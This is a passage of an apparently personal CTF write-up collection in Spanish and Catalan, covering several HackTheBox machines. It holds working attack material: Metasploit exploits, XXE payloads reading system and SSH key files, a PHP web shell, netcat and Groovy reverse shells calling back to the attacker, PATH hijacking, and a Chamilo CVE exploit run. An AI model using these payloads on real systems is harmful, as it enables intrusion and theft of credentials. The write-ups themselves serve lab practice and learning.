unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                  | unix/remote/17491.rb\n</code></pre> <p>Hay un exploit para metasploit. Lo probamos en la Explotacion 1</p> </li> <li> <p>Enumeramos el puerto 445</p> <p>Buscamos si hay vulnerabilidades para el servidor samba 3.0.20</p> <pre><code>searchsploit samba 3.0.20\nSamba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                        | unix/remote/16320.rb\n</code></pre> <p>Encontramos uno para matesaploit</p> <p>Lo probamos en la Explotaci\u00f3n 2</p> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Lame/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Lame/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<pre><code>msfconsole &gt;\nmsf6 &gt; search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor\n\nmsf6 &gt; use 0\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options\n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   CHOST                     no        The local client address\n   CPORT                     no        The local client port\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT    21               yes       The target port (TCP)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOST 10.10.10.3\nRHOST =&gt; 10.10.10.3\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run\n\n[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.10.3:21 - USER: 331 Please specify the password.\n[*] Exploit completed, but no session was created.\n</code></pre> <p>Tras la explotaci\u00f3n vemos que no ha funcionado.</p>"},{"location":"Writeup-ctfs/HackTheBox/Lame/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<pre><code>msf6 &gt; search samba 3.0.20\n\nMatching Modules\n================\n\n   #  Name                                Disclosure Date  Rank       Check  Description\n   -  ----                                ---------------  ----       -----  -----------\n   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba \"username map script\" Command Execution\n\nmsf6 &gt; use 0\nmsf6 &gt; show options\nmsf6 &gt; set RHOST 10.10.10.3\nmsf6 &gt; set LHOST 10.10.16.13\nmsf6 &gt; run\n\n[*] Started reverse TCP handler on 10.10.16.13:4444 \n[*] Command shell session 1 opened (10.10.16.13:4444 -&gt; 10.10.10.3:39492) at 2025-01-26 16:23:42 +0100\nshell\n[*] Trying to find binary 'python' on the target machine\n[*] Found python at /usr/bin/python\n[*] Using `python` to pop up an interactive shell\n[*] Trying to find binary 'bash' on the target machine\n[*] Found bash at /bin/bash\nback\nroot@lame:/# ls\n</code></pre> <p>Encontramos las dos flags en :</p> <ul> <li> <p>/home/makis:</p> <pre><code>root@lame:/home/makis# cat user.txt\ncat user.txt\n2ab71489edb8daf29c986bec0ee662ad\n</code></pre> </li> <li> <p>/root</p> <pre><code>root@lame:/root# cat root.txt\ncat root.txt\nd7589c76e629453b1588bce4ee7f01af\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Lame/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina f\u00e1cil sin escalada"},{"location":"Writeup-ctfs/HackTheBox/Markup/","title":"Markup","text":"<p>Plataforma: HackTheBox OS: Windows Level: Very Easy Status: Done Complete: Yes Created time: 12 de enero de 2025 15:34 IP: 10.129.95.192</p>"},{"location":"Writeup-ctfs/HackTheBox/Markup/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Markup/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.95.192 -oG allports\n\nPORT    STATE SERVICE REASON\n22/tcp  open  ssh     syn-ack ttl 127\n80/tcp  open  http    syn-ack ttl 127\n443/tcp open  https   syn-ack ttl 127\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Markup/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p22,80,443 -sCV 10.129.95.192 -oN targeted\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)\n|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)\n|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-title: MegaShopping\n|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28\n443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)\n|_ssl-date: TLS randomness does not represent time\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-title: MegaShopping\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)</li> <li>80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)</li> <li>443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)</li> </ul> </li> <li> <p>Enumeracion web</p> <p>whatweb</p> <pre><code>whatweb 10.129.95.192\nhttp://10.129.95.192 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28], IP[10.129.95.192], OpenSSL[1.1.1c], PHP[7.2.28], PasswordField[password], PoweredBy[Megacorp], Script, Title[MegaShopping], X-Powered-By[PHP/7.2.28]\n</code></pre> <p></p> <p>Encontramos un panel de login. Buscamos credenciales por defecto con Burpsuite</p> <p>Capturamos petici\u00f3n y mandamos al Intruder. Una vez alli, configuramos el tipo de ataque \u201cCluster Bomb\u201d para que combine los dos campos. </p> <p>El payload 1 y dos para usuario y password respectivamente. Usamos diccionarios de Seclist</p> <p></p> <p>Ejecumaos ataque y obtenemos que la combinaci\u00f3n \u201cadmin\u201d y \u201cpassword\u201d nos dan un tama\u00f1o diferente y un codigo 200</p> <p></p> <p>Accedemos a la web con estas credenciales</p> <p></p> <p>Vemos el apartado \u201cOrder\u201d para hacer pedidos y vamos a probar diferenes opciones</p> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Markup/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Markup/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Siguiendo las instrucciones de la maquina, miramos de encontar un XXE.</p> <p>Capturamos una peticion en Order y cambiamos payload para XXE</p> <p></p> <p>Le ponemos nombre \u201cexploit\u201d y el triger es xxe</p> <p>Luego, probamos en los 3 campos y vemos que es el Item el que ejecuta el payload</p> <p>Para una maquina linux seria:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE exploit [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n</code></pre> <p>Y para windows:</p> <pre><code>&lt;?xml version = \"1.0\"?&gt;\n&lt;!DOCTYPE exploit [&lt;!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'&gt; ]&gt;\n&lt;order&gt;\n    &lt;quantity&gt;\n            4\n    &lt;/quantity&gt;\n    &lt;item&gt;\n            &amp;xxe;\n    &lt;/item&gt;\n    &lt;address&gt;\n            avenu\n    &lt;/address&gt;\n&lt;/order&gt;\n</code></pre> <p>Aprovechando el xxe intentamos listar ficheros importantes.</p> <p>Como en la web hemos enumerado en el Codigo HTML el usuario Daniel, intentamos obtener la id_rsa de este usuario</p> <p></p> <pre><code>&lt;!DOCTYPE exploit [&lt;!ENTITY xxe SYSTEM 'file:///c:/users/Daniel/.ssh/id_rsa'&gt; ]&gt;\n</code></pre> <p>Obtenemos el fichero:</p> <p></p> <p>Intentamos conectar por ssh</p> <pre><code>nano id_rsa\nchmod 600 id_rsa\nssh -i id_rsa daniel@10.129.95.192\n\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\ndaniel@MARKUP C:\\Users\\daniel&gt;\n\ndaniel@MARKUP C:\\Users\\daniel\\Desktop&gt;type user.txt\n032d2fc8952a8c24e39c8f0ee9918ef7       \n</code></pre> <p>User flag: 032d2fc8952a8c24e39c8f0ee9918ef7</p>"},{"location":"Writeup-ctfs/HackTheBox/Markup/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Vemos que en la carpeta indicada hay el bat : job.bat</p> <pre><code>daniel@MARKUP C:\\Log-Management&gt;type job.bat\n@echo off\nFOR /F \"tokens=1,2*\" %%V IN ('bcdedit') DO SET adminTest=%%V\nIF (%adminTest%)==(Access) goto noAdmin\nfor /F \"tokens=*\" %%G in ('wevtutil.exe el') DO (call :do_clear \"%%G\")\necho.\necho Event Logs have been cleared!\ngoto theEnd\n:do_clear\nwevtutil.exe cl %1\ngoto :eof\n:noAdmin\necho You must run this script as an Administrator!\n:theEnd\nexit\n</code></pre> <p>Buscamos que es \u201cwevtutil.exe\u201d</p> <pre><code>Wevtutil.exe es una utilidad de l\u00ednea de comandos de administrador que se utiliza principalmente para registrar el proveedor de eventos en el equipo. Proporciona informaci\u00f3n de metadatos sobre el proveedor, sus eventos y los canales en los que registra eventos, y para consultar eventos desde un canal o archivo de registro. Esta b\u00fasqueda busca wevtutil.exe con par\u00e1metros para borrar los registros de eventos de la aplicaci\u00f3n, la seguridad, la configuraci\u00f3n o el sistema, que pueden ser utilizados por los autores de ransomware en preparaci\u00f3n para un ataque o durante este.\n</code></pre> <p>Vemos que este proceso se ejecuta en la maquina victima:</p> <p></p> <p>Miramos que permisos tiene el bat:</p> <pre><code>daniel@MARKUP c:\\Log-Management&gt;icacls job.bat\njob.bat BUILTIN\\Users:(F)\n        NT AUTHORITY\\SYSTEM:(I)(F)\n        BUILTIN\\Administrators:(I)(F)\n        BUILTIN\\Users:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>Permisos </p> <pre><code>                  - Permisos simples\n\n                                N - no access\n                F - full access\n                M - modify access\n                RX - read and execute access\n                R - read-only access\n                W - write-only access\n                D - delete access\n\n            - Permisos especiales\n\n                DE - delete\n                RC - read control\n                WDAC - write DAC\n                WO - write owner\n                S - synchronize\n                AS - access system security\n                MA - maximum allowed\n                GR - generic read\n                GW - generic write\n                GE - generic execute\n                GA - generic all\n                RD - read data/list directory\n                WD - write data/add file\n                AD - append data/add subdirectory\n                REA - read extended attributes\n                WEA - write extended attributes\n                X - execute/traverse\n                DC - delete child\n                RA - read attributes\n                WA - write attributes\n\n            - PErmisos herdados\n\n                    (OI) - object inherit\n                (CI) - container inherit\n                (IO) - inherit only\n                (NP) - don't propagate inherit\n                (I) - permission inherited from parent container\n</code></pre> <p>La manera de escalar privilegios es, aprovechando que el script puede modificarse, emitir una rever shell a nuestro equipo con permisos de administrador</p> <p>Para ello descargamos el netcat para la maquina victima y lo compartimos con python desde la nuestra</p> <pre><code># Nuestra maquina\nwget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe\n\u276f python3 -m http.server 8000\n\n#Maquina victima : \n# Desde powershell obtenemos el ejecutable de netcat de nuestra maquina\n\nPS C:\\Log-Management&gt; wget http://10.10.16.103/nc64.exe -outfile nc.exe\n\n# Modificamos el contenido para crear la rever. Con esto le decimos que dentro sustitya el contenido de job.bat por la revershell con permsios de admin (-e)\n\ndaniel@MARKUP c:\\Log-Management&gt;echo C:\\Log-Management\\nc.exe -e cmd.exe 10.10.16.103 4444 &gt; C:\\Log-Management\\job.bat\n\n# Nos ponemos en escucha en nustra maquina\n\nsudo nc -lvnp 4444\n\n# Esperamos un tiempo a que se ejecue en la maquina victima y obtenemos la rever \n\nlistening on [any] 4444 ...\nconnect to [10.10.16.103] from (UNKNOWN) [10.129.95.192] 49684\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\nC:\\Users\\Administrator\\Desktop&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is BA76-B4E3\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n03/05/2020  06:33 AM    &lt;DIR&gt;          .\n03/05/2020  06:33 AM    &lt;DIR&gt;          ..\n03/05/2020  06:33 AM                70 root.txt\n               1 File(s)             70 bytes\n               2 Dir(s)   7,374,331,904 bytes free\n\nC:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\nf574a3e7650cebd8c39784299cb570f8\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Markup/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina que me ha resultado dificil por ser de las primeras on windows. He aprendido sobre privesc en windows."},{"location":"Writeup-ctfs/HackTheBox/Mongod/","title":"Mongod","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 4 de enero de 2025 16:02 IP: 10.129.83.144</p>"},{"location":"Writeup-ctfs/HackTheBox/Mongod/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Maquina very easy del Trier 0 de HTB"},{"location":"Writeup-ctfs/HackTheBox/Mongod/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -www 10.129.83.144 -oG allports\n\nPORT      STATE SERVICE REASON\n22/tcp    open  ssh     syn-ack ttl 63\n27017/tcp open  mongod  syn-ack ttl 63\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Mongod/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -sCV -p22,27017 10.129.83.144 -oN targeted\n\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n27017/tcp open  mongodb MongoDB 3.6.8 3.6.8\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</li> <li>27017/tcp open  mongodb MongoDB 3.6.8 3.6.8</li> </ul> </li> </ul> <p>Vemos que con el script de nmap nos ha enumerado toda la BD de Mongo</p> <pre><code>db.flag.find().documents\ndb.coll.find().pretty()27017\n</code></pre> <p>Nos conectamos con</p> <pre><code>mongo 10.129.83.144:27010\n\ntest&gt; show dbs\nadmin                  32.00 KiB\nconfig                 72.00 KiB\nlocal                  72.00 KiB\nsensitive_information  32.00 KiB\nusers                  32.00 KiB\ndb&gt; use admin\nswitched to db admin\nadmin&gt; show collections\nsystem.version\nadmin&gt; use sensitive_information\nswitched to db sensitive_information\nsensitive_information&gt; show collections\nflag\nsensitive_information&gt; db.flag.find()\n[\n  {\n    _id: ObjectId(\"630e3dbcb82540ebbd1748c5\"),\n    flag: '1b6e6fb359e7c40241b6d431427ba6ea'\n  }\n]\nsensitive_information&gt; \n</code></pre> <p>Flag: 1b6e6fb359e7c40241b6d431427ba6ea</p>"},{"location":"Writeup-ctfs/HackTheBox/Mongod/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 No hay explotaci\u00f3n"},{"location":"Writeup-ctfs/HackTheBox/Mongod/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina muy facil, sin explotaci\u00f3n"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/","title":"Oopsie","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 24 de diciembre de 2024 16:01</p> <p>\ud83c\udf10 IP: <code>10.129.105.138</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento inicial"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.105.138 -oG allports\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p22,80 -sCV 10.129.105.138 -oN targeted\n</code></pre> <p></p> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22 SSH: Encotramos clave SSH RSA</li> </ul> <p></p> <ul> <li>80</li> </ul> <pre><code>whatweb 10.129.105.138\n</code></pre> </li> </ul> <p></p> <pre><code>feroxbuster --url http://10.129.105.138\n</code></pre> <p></p> <p>Encontramos ruta : /cdn-cgi/login</p> <p></p> <p>Al no disponer de credenciales, accedmos como \u201cGuest\u201d</p> <p>Enumeramos la web :</p> <p>Account con ID = 2</p> <p></p> <p>Cambiamos el ID a 1 y encontramos usuario admin con ID: 34322</p> <p>Lo mismo para las otras secciones. Encontramos clients y al cambiar el ID sacamos usuario</p> <p>Mail : john@tafcz.co.uk</p> <p>Name: Tafcz</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Mediante Burpsuite, interceptamos la peticion y cambiamos el id por el 34322 y admin , para acceder al panel \u201cUpload\u201d </p> <p></p> <p></p> <p>Probamos a subir el una shell para RCE :</p> <pre><code>&lt;?php echo \"&lt;pre&gt;\" . system($_GET['cmd']) . \"&lt;/pre&gt;\"; ?&gt;\n</code></pre> <p></p> <p>Tratamos de acceder:</p> <p></p> <p>Tenemos ejecucci\u00f3n remota de comandos</p> <p>Tratamos de ejecutar una revershell:</p> <p>Subimos revershell de pentestmonkey y obtenemos revershell </p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#_1","title":"Oopsie","text":""},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Escalamos privilegios desde www-data"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Una vez accedemos, enumeramos el sistema y encontramos como migrar a usuario robert en db.php</p> <p></p> <p>User: robert</p> <p>Password: M3g4C0rpUs3r!</p> <p></p> <p>Buscamos binarios SUID. </p> <p>No podemos ejecutar sudo -l</p> <p>Hacemos</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n\n/bin/fusermount\n/bin/umount\n/bin/mount\n/bin/ping\n/bin/su\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/bin/newuidmap\n/usr/bin/passwd\n/usr/bin/at\n/usr/bin/bugtracker\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/traceroute6.iputils\n/usr/bin/newgidmap\n/usr/bin/gpasswd\n/usr/bin/sudo\n</code></pre> <p>De los binarios que aparece, investigamos bugtracker</p> <pre><code>bugtracker\n\nrobert@oopsie:~$ bugtracker     \n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: 23453\n---------------\n\ncat: /root/reports/23453: No such file or directory\n</code></pre> <p>Haciendo un strings del binario, vemos que ejecuta cat con ruta relativa:</p> <pre><code>------------------\n: EV Bug Tracker :\n------------------\nProvide Bug ID: \n---------------\ncat /root/reports/\n;*3$\"\nGCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\n</code></pre> <p>Provamos a hacer un Path hijacking para CAT:</p> <pre><code>robert@oopsie:/usr/bin$ cd /home\n\nrobert@oopsie:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n\nrobert@oopsie:~$ export PATH=.:$PATH\nrobert@oopsie:~$ echo $PATH\n.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\nrobert@oopsie:~$ echo 'bash -p' &gt; cat\nrobert@oopsie:~$ chmod +x cat\nrobert@oopsie:~$ ls -l\ntotal 8\n-rwxrwxr-x 1 robert robert  8 Dec 24 20:44 cat\n-rw-r--r-- 1 robert robert 33 Feb 25  2020 user.txt\n\nrobert@oopsie:~$ bugtracker \n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: wer\n---------------\n\nroot@oopsie:~# whoami\nroot\n</code></pre> <p>Buscamos la flag :</p> <pre><code>root@oopsie:/# cd root\nroot@oopsie:/root# ls\nreports  root.txt\nroot@oopsie:/root# cat root.txt \naf13b0bee69f8a877c3faf667f7beacf\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Oopsie/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina facil. Para recordar buscar binarios SUID a mano si no funciona sudo -l y tener presente siempre el acceso a binarios con rutas relativas"},{"location":"Writeup-ctfs/HackTheBox/Pennyworth/","title":"Pennyworth","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 9 de enero de 2025 21:15 IP: 10.129.164.29</p>"},{"location":"Writeup-ctfs/HackTheBox/Pennyworth/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Trier2"},{"location":"Writeup-ctfs/HackTheBox/Pennyworth/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.164.29 -oG allports\n\nPorts: 8080/open/tcp//http-proxy///\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Pennyworth/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code> \u276f sudo nmap --script=http-enum -sV 10.129.164.29 -oN webscan\n\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Jetty 9.4.39.v20210325\n| http-enum: \n|_  /robots.txt: Robots file\n|_http-server-header: Jetty(9.4.39.v20210325)\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>8080/open/tcp//http-proxy : Encontramos un Jenkins</li> </ul> </li> <li> <p>Enumeraci\u00f3n puerto 8080</p> <p></p> <p>Enumeramos la version, con :</p> <pre><code>http://10.129.164.29:8080/error\n</code></pre> <p></p> <p>Probamos a acceder con credenciales por defecto y entramos con :</p> <p>root/password</p> <p>Buscamos una rever shell y la ejecutamos en el editor de scripts Groovy:</p> <p></p> <p>Encontramos la rever en :</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p> <pre><code>String host=\"10.0.0.1\";\nint port=4242;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n\n# Cambiamos el cmd por /bin/bash\n\nString cmd=\"/bin/bash\";\n</code></pre> <p>Nos ponemos en escucha y obtenemos la consola</p> <p>Buscamos la flag:</p> <p></p> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Pennyworth/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina etiquetada como muy facil, pero que me ha costado mucho y he tenido que mirar writeup por desconocimiento de Jerkins"},{"location":"Writeup-ctfs/HackTheBox/PermX/","title":"PermX","text":"<p>Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 2 de diciembre de 2024 13:58 IP: 10.10.11.23</p>"},{"location":"Writeup-ctfs/HackTheBox/PermX/#reconocimiento","title":"Reconocimiento","text":"<p>NMAP all ports: </p> <pre><code>sudo nmap -p-  -open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.23 -oG allports\n</code></pre> <p></p> <p>NMAP specific ports </p> <pre><code>sudo nmap -p22,80 -sCV 10.10.11.23 -oN nmap\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/PermX/#serveis-web","title":"Serveis Web","text":"<p>Entrem  a la web i ens dona error. Ens posa que no pot conectar amb permx.htb Afegitm el domini al host</p> <pre><code>echo -n '10.10.11.23 permx.htb' | sudo tee -a /etc/hosts &gt; /dev/null\n</code></pre> <p>Llavors si accedir a la web:</p> <p></p> <p>BUsquem subdominis amnb ffuf</p> <pre><code>fuf -w [seclist] -u [&lt;http://ejemplo.com&gt;] -H \"Host: FUZZ.board.htb\" -fs 15949\n</code></pre> <p>Trobem subdomini : lms S'afegeix al etc/hosts</p> <p></p> <p>Busquem directoris amb gobuster:</p> <pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u &lt;http://lms.permx.htb&gt; -x .php,txt,py\n</code></pre> <p></p> <p>Trobem un robots.txt</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/PermX/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de vulnerabilidades","text":"<p>Exploit: Veiem que hi ha un exploit per aquesta versio de Cahaleon </p> <p>https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit</p>"},{"location":"Writeup-ctfs/HackTheBox/PermX/#explotacion-de-vulnerabilidades","title":"Explotaci\u00f3n de vulnerabilidades","text":"<p>Executem exploit:</p> <pre><code>./CVE-2023-4220.sh -f php-reverse-shell.php -h &lt;http://lms.permx.htb/&gt; -p 4444\nnc -lvp 4444\n</code></pre> <p>Obtenim una web shell:</p> <p></p> <p>Busquem usuaris al etc/passwd</p> <p>Usuari: mtz</p> <p>Busquem permissos:</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p></p> <p>Busquem credencials a la configuracio de Chamilo</p> <p>fitxer: var/www/chamilo/conf/configration.php</p> <p></p> <p>User: chamilo Pass: 03F6lY3uXAP2bkW8 Password encription: bcrypt</p>"},{"location":"Writeup-ctfs/HackTheBox/PermX/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Provem a fer servir aquest password amb usuari trobat abans: 